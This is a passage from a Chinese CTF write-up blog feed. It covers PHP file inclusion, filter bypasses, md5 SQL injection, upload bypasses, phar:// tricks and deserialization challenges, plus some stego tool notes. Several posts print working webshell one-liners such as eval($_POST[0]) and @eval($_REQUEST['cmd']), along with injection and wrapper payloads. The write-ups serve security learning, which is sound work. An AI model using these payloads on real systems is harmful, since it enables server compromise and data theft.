class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>经验证，无法使用伪协议绕过</p>
<p>试一下日志文件包含</p>
<p>直接访问 ?file=/var/log/nginx/access.log</p>
<p>发现user-agent能写入shell<br>User-Agent: <?php echo 123;phpinfo();eval($_POST[0]);?></p>
<p><img src="/2023/01/07/UA%E5%A4%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-ctfshow-80-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1671423435716-bccf22d9-a679-46d3-a04a-f2645b074125.png" alt="img"></p>
<p>直接连接蚁剑拿到flag</p>
<p>知识点</p>
<p>访问日志文件记录了服务器收到的每一次请求的 IP、访问时间、URL、User-Agent，这4项中的前两项的值都是我们无法控制的，我们只能在自己可以控制的字段上做手脚，其中URL字段由于URL编码的存在，空格等一些符号无法包含其中，而User-Agent则不会被进行任何二次处理，我们发什么内容，服务器就将其原封不动的写入日志。</p>
<p>访问日志的位置和文件名在不同的系统上会有所差异</p>
<p>apache一般是/var/log/apache/access.log </p>
<p>nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log</p>
]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow web32 对分号、括号的绕过</title>
    <url>/2023/01/07/ctfshow-web32-%E5%AF%B9%E5%88%86%E5%8F%B7%E3%80%81%E6%8B%AC%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 00:56:31</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>过滤了 flag system php cat sort shell . space ’ ` echo ; (</p>
<p>过滤了空格可以用${IFS}和%0a 代替，分号可以用?&gt;代替<br>但是过滤了括号之后就不能用带有括号的函数，php中include是可以不带括号的函数，和web31一样，这里需要用文件包含</p>
<p>php伪协议通常用于文件包含中，php中文件包含的函数有很多，比如  include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readfile</p>
<p>c=include$_GET[“1”]?&gt;</p>
<p>&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</p>
<p>也可以data伪协议</p>
<p><img src="/2023/01/07/ctfshow-web32-%E5%AF%B9%E5%88%86%E5%8F%B7%E3%80%81%E6%8B%AC%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87/1671418472191-aca008df-ed05-4206-bc53-0490feaec1e2.png" alt="img"></p>
]]></content>
      <categories>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>(data伪协议利用)[SWPUCTF 2021 新生赛]PseudoProtocols</title>
    <url>/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/</url>
    <content><![CDATA[<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670983882058-c9be0e2d-b933-4549-b15f-170fe2f23f25.png" alt="img"></p>
<span id="more"></span>

<p>利用filter伪协议读取hint.php文件</p>
<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670983908738-ca366767-a56c-4b08-8b1d-411cb75c93b4.png" alt="img"></p>
<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670983956595-161766cb-00be-42f6-ba3a-b2c76b0ab005.png" alt="img"></p>
<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670983975968-8e569827-467c-4454-a3eb-f87d4bdd8d0e.png" alt="img"></p>
<p>分析代码</p>
<p>ini_set(“max_execution_time”, “180”);通过“ini_set(“max_execution_time”,”180”);”增加脚本执行时间。</p>
<p>if(isset($a)&amp;&amp;(file_get_contents($a,’r’)) === ‘I want flag’)   //a参数利用file_get_contents()函数只读形式打开，打开后内容要与”I want flag”字符串相匹配，才能执行下面的文件包含$file参数。</p>
<p>看到用的是file_get_contents()函数打开text参数，以及后面的文件包含函数，自然的想到php伪协议中的data://协议。</p>
<p>构造?a=data://text/plain;base64,SSB3YW50IGZsYWc= 。得到flag。</p>
<p><img src="/2023/01/07/data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols/1670984151591-43784152-bee8-4420-979b-9b1684688eb9.png" alt="img"></p>
]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>easy_md5(复现)</title>
    <url>/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p><img src="/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/1670938628105-3d90a17a-a99f-44be-8f72-5ef78a5a15f2.png" alt="img"></p>
<span id="more"></span>

<p>啥也没有，看一下数据包</p>
<p><img src="/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/1670938672266-af02f62a-191a-4c56-8587-219745c7dea9.png" alt="img"></p>
<p>提示了</p>
<ol>
<li><strong>hint:</strong> select * from ‘admin’ where password=md5($pass,true)</li>
</ol>
<p>首先看一下md5($pass,true)这个函数</p>
<p><img src="/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/1670938727413-13a1a40b-9063-4da8-9663-472d89f93eb2.png" alt="img"></p>
<p>这里需要注意的是，当raw项为true时，返回的这个原始二进制不是普通的二进制（0，1），而是  ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c  这种。</p>
<p>​       比如’ffifdyop‘字符串对应的16位原始二进制的字符串就是”    ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c    “  。  ‘  \  ‘后面的3个字符连同’  \  ‘算一个字符，比如’    \xc9    ‘，所以上述一共16个。当然，像’    \xc9    ‘这种字符会显示乱码。<br> 为true时<img src="/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/1670938814874-64989d90-7724-4a32-9525-d0ac0262e78a.png" alt="img"></p>
<p>当为false时</p>
<p><img src="/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/1670938847752-6cdf5168-684d-427e-bcda-cfac9d493aee.png" alt="img"></p>
<p>true时   </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or&#x27;6?]??!r,??b     #16位原始2进制字符串</span><br></pre></td></tr></table></figure>

<p>false</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">276f722736c95d99e921722cf9ed621c     #32位16进制字符串</span><br></pre></td></tr></table></figure>

<p>所以false中的每两位16进制化为的10进制数对应true中的一位</p>
<p>比如 27 对应  ‘</p>
<p>6f 对应 o</p>
<p>所以我们要构造一个md5值中带有    xxx’or’xxxxxx  的字符</p>
<p>这样就可以闭合 select * from ‘admin’ where password=  ‘xxx’or’1xxxxx’ (or后面的数字1~9都行)</p>
<p>原因如下：</p>
<p><img src="/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/1670939215529-8767f756-c446-4ddf-8c49-9e117e4a9d53.png" alt="img"></p>
<p>所以我们需要的字符串的原始二进制格式的字符串里要包含    ‘or’    ，如果根据原始二进制来找到我们要的字符串可能会比较麻烦，那么可以根据32位16进制的字符串来查找，根据上面介绍的，  ‘or’   对应的16进制是   276f7227    ，所以我们的目标就是要找一个字符串取32位16进制的md5值里带有276f7227这个字段的，接着就是要看关键的数字部分了，在276f7227这个字段后面紧跟一个数字，除了0，1-9，对应的asc码值是49-57，转化为16进制就是31-39，也就是我们需要有276f7227+（31-39）这个字段，就可以满足要求。比如xxxxxxxxxxxxxxxx276f7227（31-39）xxxxxx</p>
<p>输入ffifdyop</p>
<p><img src="/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/1670940081049-eb1e4833-07df-4007-b02f-dd286f58fc64.png" alt="img"></p>
<p>看源码</p>
<p><img src="/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/1670940118986-bd7dd214-7444-4c26-a6eb-7348b3de835d.png" alt="img"></p>
<p>因为md5函数不能解析数组，导致函数返回Null。而Null是等于Null的，导致了绕过。看下面的示例，是返回了yes的。（题目中就传入    ?a[]=1&amp;b[]=2    ）</p>
<p><img src="/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/1670940231668-3d883c1d-1ead-4393-b074-f04115650c47.png" alt="img"></p>
<p>构造?a[]=1&amp;b[]=2</p>
<p><img src="/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/1670940157598-b216f6ae-bbb6-4a83-987c-a6fef5db2dae.png" alt="img"></p>
<p>接着构造</p>
<p>param1[]=1&amp;param2[]=2</p>
<p><img src="/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/1670940412975-67720e4c-a2f3-422b-92f0-b74c3b8be055.png" alt="img"></p>
<p>得到flag：    NSSCTF{fb498f88-84ad-4543-8225-dc7536c24cf6}</p>
]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>gaps安装</title>
    <url>/2023/01/07/gaps%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>看了很多教程最后花了几个小时装了下来，记录一下。</p>
<span id="more"></span>

<p>下载命令</p>
<p>git clone <a href="https://github.com/nemanja-m/gaps.git">https://github.com/nemanja-m/gaps.git</a> #gaps官网</p>
<p>cd gaps</p>
<p>pip install -r requirements.txt</p>
<p>sudo apt-get install python-tk</p>
<p>pip install -e .</p>
<p>我的kali进不了github所以我在windows下将gaps包挪到了kali中。</p>
<p>命令行中输入gaps即可在kali中下载。</p>
<p>下载后使用命令</p>
<p>sudo apt-get install python3-pillow</p>
<p>sudo apt-get install python3-numpy</p>
<p>sudo apt-get install python3-opencv-python </p>
<p>sudo apt-get install python3-pytest</p>
<p>sudo apt-get install python3-matplotlib</p>
<p>然后查看requirements.txt</p>
<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417498906-713dabb9-3fbd-4540-880d-815a3c3aa501.png" alt="img"></p>
<p>对应的各自版本号，不同则修改</p>
<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417561551-f1c02b9e-7de4-4d1c-8416-4ff674cc220d.png" alt="img"></p>
<p>括号内的就是版本号</p>
<p>最后使用命令pip3 install -e .</p>
<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417638964-4c8641f7-0894-4e6c-bfa4-e3da6cc51f75.png" alt="img"></p>
<p>出现以上内容安装成功。</p>
]]></content>
      <categories>
        <category>ctf工具</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>(.htaccess+script)[GXYCTF2019]BabyUpload</title>
    <url>/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/</url>
    <content><![CDATA[<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731946450-102dae86-780f-4b7a-8222-21b24dd58230.png" alt="img"></p>
<span id="more"></span>

<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731960615-14bf03ed-53af-4ccb-86e1-754fb3f36799.png" alt="img"></p>
<p>1.上传php文件</p>
<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731991227-e3ce0e92-9489-4942-a1c8-e72c3bfd6d03.png" alt="img"></p>
<p>可见有后缀名过滤</p>
<p>2.上传jpg文件</p>
<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732037682-6084f936-f4e2-4a02-9294-e9c8d62162cd.png" alt="img"></p>
<p>可见对文件内容为&lt;?可能有过滤</p>
<p>3.上传.htaccess文件</p>
<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732095861-09069902-ef31-4645-ab56-db23820b48fe.png" alt="img"></p>
<p>经过分析，是mime类型过滤</p>
<p>将mime类型改为image/jpeg即可</p>
<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732206598-0ea5576d-0923-4721-b3dd-ce9694c0b642.png" alt="img"></p>
<p>AddType application/x-httpd-php .jpg</p>
<p>这句话的意思是将jpg文件后缀解析为php文件</p>
<p>4.传🐎</p>
<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732328192-ada01c3d-260b-40f2-bb47-09e90cc15fbe.png" alt="img"></p>
<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732337448-2482057a-0460-4657-bdb6-2a36ca8c0b09.png" alt="img"></p>
<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732383108-234defa1-ea71-4295-8e68-2528bc5fb9e4.png" alt="img"></p>
<p>5.getshell</p>
<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732456086-1aa5e05f-4369-4123-90f1-6ffabc518d3c.png" alt="img"></p>
]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>(load_file&amp;into outfile)云演sql注入基础</title>
    <url>/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807114141-123d5599-d2ce-4598-afc6-018fd82e76ef.png" alt="img"></p>
<span id="more"></span>

<p>随便点开一则新闻</p>
<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807149490-ec21617b-5012-4f5d-8185-b3cebdc9de04.png" alt="img"></p>
<p>可以看到有注入点</p>
<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807180920-7132a4c1-c9b2-4553-ad4a-0acaf13c396e.png" alt="img"></p>
<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807192065-afb86caa-acdd-403d-bc31-8bdad668664b.png" alt="img"></p>
<p>使用and 1=1成功回显 和 and 1=2不回显 判断是整形注入</p>
<p>1.开始查字段</p>
<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807279567-51c0a74b-cf9a-4def-bb6d-8a9f8af5e102.png" alt="img"></p>
<p>2.报错出注入点</p>
<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807338156-2120348b-2be0-4c80-a780-2dea2fcd734c.png" alt="img"></p>
<p>3.查看数据库</p>
<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807361859-56b1ba95-be6d-4980-a27b-f3595f294f1a.png" alt="img"></p>
<p>4.读取linux的/etc/passwd文件</p>
<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807410488-5ea7c532-bd44-422a-bbc6-c1f1b8c28f52.png" alt="img"></p>
<p>5.写🐎</p>
<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807460252-e58b1073-e0f4-4c91-b98d-6ef4b09546fb.png" alt="img"></p>
<p>6.查看是否写入</p>
<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807485861-c41aa6bc-0ae0-4a80-ab01-62d3f0ae8bcb.png" alt="img"></p>
<p>7.连接蚁剑</p>
<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807527965-3a6b9d9a-0652-47e1-9221-b4d2aea9124a.png" alt="img"></p>
<p>8.拿flag</p>
<p>flag{b4dd36207eb58098c458fe9d9498727b}</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>mp3stego怎么用</title>
    <url>/2023/01/07/mp3stego%E6%80%8E%E4%B9%88%E7%94%A8/</url>
    <content><![CDATA[<ul>
<li><ul>
<li><p>首先先下载压缩包并解压到所需位置，打开文件夹找到名为Decode.exe和Encode.exe的文件，在地址栏复制文件位置。</p>
<span id="more"></span></li>
<li><p>win+R输入cmd打开命令行，将复制的路径粘贴到命令行下，记得在前面加cd（及进入该路径），回车后进入文件夹。</p>
</li>
<li><p>使用decode解密</p>
</li>
<li><p>将需要解密的MP3文件复制至装有decode文件的目录下，在命令行中输入</p>
</li>
<li><p>Decode.exe -X -P 密码 MP3文件名</p>
</li>
<li><p>（-X 获取隐藏文件 -P密码）</p>
</li>
<li><p>回车后等待，最后在文件夹中得到隐藏的文件</p>
</li>
<li><p>使用encode加密</p>
</li>
<li><p>同样的，将wav音频文件（我试了一下好像只能加密wav）和需要的txt文件复制到目录下，在打开的命令行中输入</p>
</li>
<li><p> encode -E 加密的txt文件 -P 密码 加密的wav文件 输出的MP3文件名 </p>
</li>
<li><p>原文链接：<a href="https://blog.csdn.net/qq_63575829/article/details/123770436">https://blog.csdn.net/qq_63575829/article/details/123770436</a></p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>ctf工具</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>outguess图片隐写工具安装使用</title>
    <url>/2023/01/07/outguess%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>outguess下载安装</p>
<p>kail 终端命令输入git clone <a href="https://github.com/crorvick/outguess%EF%BC%8C%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%88%90%E5%88%B0%E6%96%87%E4%BB%B6%E5%A4%B9%E3%80%82%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E5%8F%B3%E9%94%AE%E7%A9%BA%E7%99%BD%E5%A4%84%E9%80%89%E7%BB%88%E7%AB%AF%E6%89%93%E5%BC%80%EF%BC%8C%E8%BE%93%E5%85%A5%E5%91%BD%E4%BB%A4./configure">https://github.com/crorvick/outguess，安装包下载完成到文件夹。打开文件夹，右键空白处选终端打开，输入命令./configure</a> &amp;&amp; make &amp;&amp; make install进行安装。</p>
<span id="more"></span>

<p>使用outguess</p>
<p>输入outguess -help即可获得相关命令。</p>
<p>加密：</p>
<p>outguess -k “my secret key” -d hidden.txt demo.jpg out.jpg</p>
<p>加密之后，demo.jpg会覆盖out.jpg，hidden.txt的内容是要隐藏的东西。</p>
<p>解密：</p>
<p>outguess -k “my secret key” -r out.jpg hidden.txt</p>
<p>解密之后，紧密内容放在hidden.txt中</p>
]]></content>
      <categories>
        <category>ctf工具</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>(phar伪协议上传webshell)[NISACTF 2022]bingdundun~</title>
    <url>/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/</url>
    <content><![CDATA[<p><img src="/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/1671152984224-93f6d96f-3aee-45d6-b849-6d2ee1f3428c.png" alt="img"></p>
<span id="more"></span>

<p>点击upload</p>
<p><img src="/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/1671152997125-8e879537-7bc9-466f-b0f0-78470197a741.png" alt="img"></p>
<p>点了之后发现url地址多了一个bingdundun=upload</p>
<p>应该是上传点</p>
<p>冰墩墩喜欢图片或压缩包，限定了两种文件上传后缀</p>
<p>图片上传发现没啥利用点，试试压缩包</p>
<p>这里补充phar伪协议</p>
<p>主要是用于在php中对压缩文件格式的读取。这种方式通常是用来配合文件上传漏洞使用，或者进行进阶的phar反序列化攻击</p>
<p>用法就是把一句话木马压缩成zip格式，shell.php -&gt; shell.zip，然后再上传到服务器（后续通过前端页面上传也没有问题，通常服务器不会限制上传 zip 文件），再访问：?filename=phar://…/shell.zip/shell.php</p>
<p>写一个一句话木马</p>
<?php @eval($_REQUEST['cmd']);?>

<p>然后打包成zip</p>
<p><img src="/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/1671153311029-60edecc0-f938-4661-b680-f355c9ce863d.png" alt="img"></p>
<p>将zip包上传</p>
<p><img src="/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/1671153330839-84961a36-2f2c-47ac-84f2-e000bb12e91f.png" alt="img"></p>
<p>利用phar伪协议读取cmd.zip下的cmd.php中的内容</p>
<p><img src="/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/1671153384833-c1935424-9096-4cd2-9c26-7393fb8ca1ef.png" alt="img"></p>
<p>####这里说一下为什么cmd后面不加php后缀###</p>
<p><img src="/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/1671153426386-014dd3c6-6aa5-4832-a58b-e6b1dc66496c.png" alt="img"></p>
<p><img src="/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/1671153470792-043c4d8e-dc63-4c54-a08b-200e9779263a.png" alt="img"></p>
<p><img src="/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/1671153500571-37a9c5bf-106b-4e4c-8ba5-f475aa4abc7f.png" alt="img"></p>
<p>输入index,发现都是index.php内容</p>
<p><img src="/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/1671153545174-b05c84e4-0b6c-49b9-adf3-cfb9f5438ed1.png" alt="img"></p>
<p>意外的发现有文件包含漏洞，会自动在后面添加.php</p>
<p>就上网搜索，可以在phar解压的zip压缩包后面加/来访问里面的文件，因为会自动补.php 所以构造payload</p>
<p>所以直接payload：phar://b4a06bf38891ee9d1e4ec9906f157584.zip/cmd</p>
<p>蚁剑连一下</p>
<p><img src="/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/1671153698131-7de5a532-565f-4026-80e4-6d8cc1dcebea.png" alt="img"></p>
<p><img src="/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/1671153722388-ef50f2f7-ff91-4226-8222-0c58fc1985b8.png" alt="img"></p>
]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>php-SER-libs反序列化靶场</title>
    <url>/2023/01/07/php-SER-libs%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;flag&#x27;]);</span><br><span class="line">$a-&gt;action();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>构造类的实例化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new a();</span><br><span class="line">$a-&gt;act=&quot;show_source(&#x27;flag.php&#x27;);&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>看代码的意思$a-&gt;login()为真时，输出flag</p>
<p>也就是uesr=daydream   pass=ok</p>
<p>构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span 